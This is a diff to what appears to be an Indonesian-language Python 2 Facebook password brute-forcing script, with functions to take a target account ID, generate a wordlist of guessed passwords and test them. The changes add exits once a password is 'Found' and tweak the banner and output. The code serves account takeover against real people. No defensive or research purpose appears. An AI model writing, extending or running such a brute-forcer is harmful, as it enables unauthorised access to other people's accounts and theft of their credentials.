@@ -25,7 +25,7 @@ def banner():
 | |_| |__) \ V /   | || |_| | 
 |____/____/ \_/   |___|____/
 
- \033[32;1  D3v ID :)
+ \033[35;1m  D3v ID :)
 ''')
 banner()
 
@@ -92,16 +92,23 @@ def brute_fast():
                     if "access_token" in dev:
                         print
                         print " [OK∆] Found " + pas
+                        sys.exit()
+
                     elif "www.facebook.com" in dev["error_msg"]:
                         print
                         print " [CP∆] Found " + pas
+                        sys.exit()
+
                     else:
                         pass
             except:
+    
+              print
               print "Keluar"
     
 
 def target():
+
 	global target
 	target = raw_input("[?] Masukkan ID Target : ")
 
@@ -423,12 +430,11 @@ def wordlist():
 		file.write(pas241+b +pas242+b +pas243+b +pas244+b +pas245+b +pas246+b +pas247+b +pas248+b +pas249+b +pas250+b)
                 file.write(pas251+b +pas252+b +pas253+b)
 		file.close()
+                print
 		print " Sukses mengambil informasi"
 		brute_fast()
 
-#		print
-#		print " Sepertinya akun anda kena sesi.."
-#		os.system("rm -f login.txt")
+
 def coba():
 
 	data = open("word1.txt", "w")
